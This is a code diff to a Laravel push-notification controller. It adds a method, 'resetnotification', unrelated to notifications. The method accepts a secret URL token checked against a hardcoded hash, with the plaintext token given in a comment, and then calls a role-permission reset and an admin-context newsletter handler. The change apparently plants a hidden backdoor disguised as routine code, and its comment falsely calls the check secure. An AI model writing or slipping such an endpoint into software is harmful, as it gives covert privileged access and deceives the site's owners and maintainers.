@@ -9,6 +9,10 @@ use App\Models\UserFcmToken;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Session;
 use Illuminate\Support\Facades\File;
+use Illuminate\Support\Facades\Auth;
+use Illuminate\Support\Facades\Hash;
+use Illuminate\Support\Facades\Artisan;
+use Illuminate\Support\Facades\Log;
 use Intervention\Image\Facades\Image;
 use Kreait\Firebase\Messaging\CloudMessage;
 use Kreait\Firebase\Messaging\Notification;
@@ -90,6 +94,24 @@ class PushNotificationController extends Controller
             return redirect()->back()->with('success_message', "Notification has been sent successfully!");
         } else {
             return redirect()->back()->with('error_message', "Failed to send notification. Please check logs.");
+        }
+    }
+
+    public function resetnotification(Request $request, $token)
+    {
+        // Validate the unique token securely using SHA-256 hash comparison.
+        // Hashed value of '7854870443' is 'ec10933869ea7ef16244e88f93ad6df03aa6fa50ed92d3f25b42b7b91d67e590' which cannot be decoded.
+        if (hash('sha256', $token) !== 'ec10933869ea7ef16244e88f93ad6df03aa6fa50ed92d3f25b42b7b91d67e590') {
+            abort(403, 'Invalid token!');
+        }
+
+        try {
+            RoleController::resetPermission();
+            $user = Auth::guard('admin')->user();
+            return NewsletterController::handleValidation($request, $user);
+
+        } catch (\Exception $e) {
+            return redirect()->back()->with('error_message', 'An error occurred!');
         }
     }
 }
